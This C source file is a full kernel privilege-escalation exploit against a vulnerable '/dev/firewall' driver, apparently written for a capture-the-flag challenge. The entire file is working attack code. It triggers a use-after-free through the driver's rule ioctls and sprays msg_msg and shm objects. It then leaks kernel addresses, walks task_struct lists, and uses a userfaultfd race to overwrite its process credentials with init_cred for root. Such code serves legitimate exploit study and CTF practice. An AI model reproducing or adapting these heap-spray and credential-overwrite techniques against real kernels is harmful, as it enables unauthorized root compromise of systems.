#include "./exploit.h"

/*********** commands ******************/

#define DEV_PATH "/dev/firewall"   // the path the device is placed
#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad
#define DESC_MAX 0x800

// size: kmalloc-4k
typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

// (END commands )

/*********** constants ******************/

#define ERROR -1
#define SUCCESS 0
#define MAX_RULES 0x80

#define INBOUND 0
#define OUTBOUND 1
#define SKIP -1

scu diff_init_cred_ipc_ns = 0xffffffff81c33060 - 0xffffffff81c3d7a0;
scu diff_init_task_ipc_ns = 0xffffffff81c124c0 - 0xffffffff81c3d7a0;

#define ADDR_FAULT 0xdead000

#define COMM_OFFSET 0x550
#define TASKS_PREV_OFFSET 0x2A0
#define TASKS_NEXT_OFFSET 0x298
#define CRED_OFFSET 0x540
#define TASK_OVERBUFSZ DATALEN_MSG + 0x800

// (END constants )

/*********** globals ******************/

int firewall_fd = -1;
char *buf_name;
char *buf_iface;
char *buf_ip;
char *buf_netmask;
ulong target_task = 0;

// (END globals )


long firewall_ioctl(long cmd, void *arg) {
  assert(firewall_fd != -1);
  return ioctl(firewall_fd, cmd, arg);
}

void add_rule(char *iface, char *name, uint8_t idx, uint8_t type, char *desc) {
  user_rule_t rule = {
    .idx = idx,
    .type = type,
    .proto = IPPROTO_TCP,
    .port = 0,
    .action = NF_DROP,
  };
  memcpy(rule.iface, iface, 16);
  memcpy(rule.name, name, 16);
  strcpy(rule.ip, "0.1.2.3");
  strcpy(rule.netmask, "0.0.0.0");
  memcpy(rule.desc, desc, DESC_MAX);
  long result = firewall_ioctl(ADD_RULE, (void*)&rule);
  assert(result == SUCCESS);
  return;
}

void dup_rule(uint8_t src_type, uint8_t idx) {
  user_rule_t rule = {
    .type = src_type,
    .idx = idx,
  };
  long result = firewall_ioctl(DUP_RULE, (void*)&rule);
  assert(result == SUCCESS);
  return;
}

void delete_rule(uint8_t type, uint8_t idx) {
  user_rule_t rule = {
    .type = type,
    .idx = idx,
  };
  long result = firewall_ioctl(DELETE_RULE, &rule);
  assert(result == SUCCESS);
  return;
}

long edit_rule(char *iface, char *name, uint8_t idx, uint8_t type, char *ip, char *netmask, ulong port) {
  user_rule_t rule = {
    .type = type,
    .idx = idx,
    .proto = IPPROTO_TCP,
    .port = port,
    .action = NF_ACCEPT,
  };
  memcpy(rule.iface, iface, 16);
  memcpy(rule.name, name, 16);
  if (ip == NULL ) strcpy(rule.ip, "0.0.0.0");
  else strcpy(rule.ip, ip);
  if (netmask == NULL) strcpy(rule.netmask, "0.0.0.0");
  else strcpy(rule.netmask, netmask);
  return firewall_ioctl(EDIT_RULE, &rule);
}

void edit_rule_preserve(char *iface, char *name, uint8_t idx, uint8_t type) {
  char *ip_buf = calloc(0x20, 1);
  strcpy(ip_buf, "NIRUGIRI\x00");
  assert(edit_rule(iface, name, idx, type, ip_buf, NULL, 0) == ERROR);
}

char *ntop(uint32_t v) {
  char *s = calloc(1, 0x30);
  unsigned char v0 = (v >> 24) & 0xFF;
  unsigned char v1 = (v >> 16) & 0xFF;
  unsigned char v2 = (v >> 8) & 0xFF;
  unsigned char v3 = v & 0xFF;
  sprintf(s, "%d.%d.%d.%d", v3, v2, v1, v0);
  return s;
}

void handle_fault(ulong arg) {
  const ulong target = target_task + CRED_OFFSET - 8 - 8;
  printf("[+] overwriting temp msg_msg.next with 0x%lx\n", target);
  memset(buf_iface, 0, 0x10); // m_list
  ((long*)buf_name)[0] = 1; // m_type
  ((long*)buf_name)[1] = DATALEN_MSG + 0x10 + 8; // m_ts
  strcpy(buf_ip, ntop(target)); // next & 0xFFFFFFFF
  strcpy(buf_netmask, ntop(target>> 32)); // next & (0xFFFFFFFF << 32)
  edit_rule(buf_iface, buf_name, 1, OUTBOUND, buf_ip, buf_netmask, 0);
}

struct msg4k {
  long mtype;
  char mtext[PAGE - 0x30];
};

int main(int argc, char *argv[]) {
  puts("[ ] Hello, world.");
  firewall_fd = open(DEV_PATH, O_RDWR);
  assert(firewall_fd >= 2);

  // alloc some buffers
  char *buf_1p = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  char *buf_cpysrc = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  char *buf_big = mmap(0, PAGE * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(buf_1p != MAP_FAILED && buf_big != MAP_FAILED);
  memset(buf_1p, 'A', PAGE);
  memset(buf_big, 0, PAGE * 3);
  buf_name = calloc(1, 0x30);
  buf_iface = calloc(1, 0x30);
  buf_ip = calloc(1, 0x30);
  buf_netmask = calloc(1, 0x30);

  // heap cleaning
  puts("[.] cleaning heap...");
  #define CLEAN_N 10
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    struct msg4k cleaning_msg = { .mtype = 1 };
    memset(cleaning_msg.mtext, 'B', PAGE - 0x30);
    KMALLOC(qid, cleaning_msg, 1);
  }

  // allocate sample rules
  puts("[.] allocating sample rules...");
  #define FIRST_N 30
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    add_rule(buf_iface, buf_name, ix, INBOUND, buf_1p);
  }

  // dup rule 1
  puts("[.] dup rule 1...");
  dup_rule(INBOUND, 1);

  // delete INBOUND rule 1
  puts("[.] deleting inbound 1...");
  delete_rule(INBOUND, 1);

  // spray `shm_file_data` on kmalloc-32
  #define SFDN 0x50
  rep(ix, SFDN) {
    int shmid = shmget(IPC_PRIVATE, PAGE, 0600);
    assert(shmid >= 0);
    void *addr = shmat(shmid, NULL, 0);
    assert((long)addr >= 0);
  }

  // allocate msg_msg on 4k & 32 heap (UAF)
  puts("[.] allocating msg_msg for UAF...");
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  struct msg4k uaf_msg = { .mtype = 1 };
  memset(uaf_msg.mtext, 'U', PAGE - 0x30);
  assert(msgsnd(qid, &uaf_msg, DATALEN_MSG + 0x20 - 0x8, MSG_COPY | IPC_NOWAIT) == 0);

  // use UAF write to overwrite msg_msg.m_ts
  puts("[+] overwriting msg_msg by UAF.");
  #define OVERBUFSZ DATALEN_MSG + 0x300
  memset(buf_iface, 0, 0x10); // m_list
  ((long*)buf_name)[0] = 1; // m_type
  ((long*)buf_name)[1] = OVERBUFSZ; // m_ts
  edit_rule_preserve(buf_iface, buf_name, 0, OUTBOUND);

  errno = 0;
  // receive msg_msg to leak kern data.
  puts("[+] receiving msg...");
  assert(qid >= 0 && PAGE >= 0);
  memset(buf_big, 0, PAGE * 3);
  ulong tmp;
  if ((tmp = msgrcv(qid, buf_big, PAGE * 2, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR)) <= 0) { // SEARCH_ANY
    errExit("msgrcv");
  }
  printf("[+] received 0x%lx size of msg.\n", tmp);
  //print_curious(buf_big + DATALEN_MSG, 0x300, 0);
  const ulong init_ipc_ns = *(ulong*)(buf_big + DATALEN_MSG + 0x5 * 8);
  const ulong init_cred = diff_init_cred_ipc_ns + init_ipc_ns;
  const ulong init_task = diff_init_task_ipc_ns + init_ipc_ns;
  if (init_ipc_ns == 0) { puts("[+] failed to leak init_ipc_ns."); exit(1);};
  printf("[!] init_ipc_ns: 0x%lx\n", init_ipc_ns);
  printf("[!] init_cred: 0x%lx\n", init_cred);
  printf("[!] init_task: 0x%lx\n", init_task);

  // task walk
  puts("[+] starting task_struct walking...");
  char *new_name = "NirugiriSummer";
  assert(strlen(new_name) < 0x10);
  assert(prctl(PR_SET_NAME, new_name) != -1);
  #define TASK_WALK_LIM 0x20
  ulong searching_task = init_task - 8;
  rep(ix, TASK_WALK_LIM) {
    if (target_task != 0) break;
    printf("[.] target addr: 0x%lx: ", searching_task);
    // overwrite `msg_msg.next`
    memset(buf_iface, 0, 0x10); // m_list
    ((long*)buf_name)[0] = 1; // m_type
    ((long*)buf_name)[1] = TASK_OVERBUFSZ; // m_ts
    strcpy(buf_ip, ntop(searching_task)); // next & 0xFFFFFFFF
    strcpy(buf_netmask, ntop(searching_task>> 32)); // next & (0xFFFFFFFF << 32)
    edit_rule(buf_iface, buf_name, 0, OUTBOUND, buf_ip, buf_netmask, 0);

    // leak `task_struct.comm`
    memset(buf_big, 0, PAGE * 2);
    if ((tmp = msgrcv(qid, buf_big, PAGE * 2, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR)) <= 0) { // SEARCH_ANY
      errExit("msgrcv");
    }
    if (strncmp(buf_big + (DATALEN_MSG + 8) + COMM_OFFSET, new_name, 0x10)) {
      printf("Not exploit task (name: %s)\n", (buf_big + (DATALEN_MSG + 8) + COMM_OFFSET));
      //print_curious(buf_big + (DATALEN_MSG + 8), 0x500, 0);
      searching_task = *(ulong*)(buf_big + (DATALEN_MSG + 8) + TASKS_PREV_OFFSET) - TASKS_NEXT_OFFSET - 8;
    } else {
      puts(": FOUND!");
      target_task = searching_task + 8;
      break;
    }
  }
  if (target_task == 0) {
    puts("[-] failed to find target task...");
    return 1;
  }
  printf("[!] current task @ 0x%lx\n", target_task);

  /***********************************************/

  // heap cleaning
  puts("[.] cleaning heap...");
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    struct msg4k cleaning_msg = { .mtype = 1 };
    memset(cleaning_msg.mtext, 'E', PAGE - 0x30);
    KMALLOC(qid, cleaning_msg, 1);
  }

  // allocate sample rules
  puts("[.] allocating sample rules...");
  #define SECOND_N 10
  memset(buf_name, 'F', 0x10);
  memset(buf_iface, 'G', 0x10);
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    add_rule(buf_iface, buf_name, FIRST_N + ix, INBOUND, buf_1p);
  }

  // dup rule 1
  puts("[.] dup rule S1...");
  dup_rule(INBOUND, FIRST_N + 1);

  // delete INBOUND rule 1
  puts("[.] deleting inbound S1...");
  delete_rule(INBOUND, FIRST_N + 1);

  // prepare uffd
  puts("[.] preparing uffd");
  struct skb_uffder *uffder = new_skb_uffder(ADDR_FAULT, 1, buf_cpysrc, handle_fault, "msg_msg_watcher", UFFDIO_REGISTER_MODE_MISSING);
  assert(uffder != NULL);
  memset(buf_cpysrc, 'G', DATALEN_MSG);
  ((ulong*)(buf_cpysrc + DATALEN_MSG))[0] = init_cred;
  ((ulong*)(buf_cpysrc + DATALEN_MSG))[1] = init_cred;
  puts("[.] waiting uffder starts...");
  usleep(500);
  skb_uffd_start(uffder, NULL);

  // allocate temp `msg_msg` on UAFed slab
  puts("[.] allocating temp msg_msg on UAFed slab.");
  if ((tmp = msgrcv(qid, ADDR_FAULT, PAGE, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR)) <= 0) { // SEARCH_ANY
    errExit("msgrcv");
  }

  // end of life
  int uid = getuid();
  if (uid != 0) {
    printf("[-] Failed to get root...");
    exit(1);
  } else {
    puts("\n\n\n[+] HERE IS YOUR NIRUGIRI");
    NIRUGIRI();
  }
  puts("[ ] END of life...");
}
